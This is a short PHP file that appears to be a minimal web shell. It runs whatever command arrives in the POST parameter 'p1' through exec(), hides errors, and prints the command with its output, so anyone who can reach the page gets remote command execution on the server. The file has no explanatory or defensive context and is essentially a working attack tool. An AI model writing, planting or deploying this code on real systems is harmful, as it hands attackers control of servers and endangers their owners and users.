<?php
function ex($in) {
	$out = '';
	if(function_exists('exec')) {
		@exec($in,$out);
		$out = @join("\n",$out);
	}
	return $out;
}

echo htmlspecialchars("$ ".$_POST['p1']."\n".ex($_POST['p1']));
?>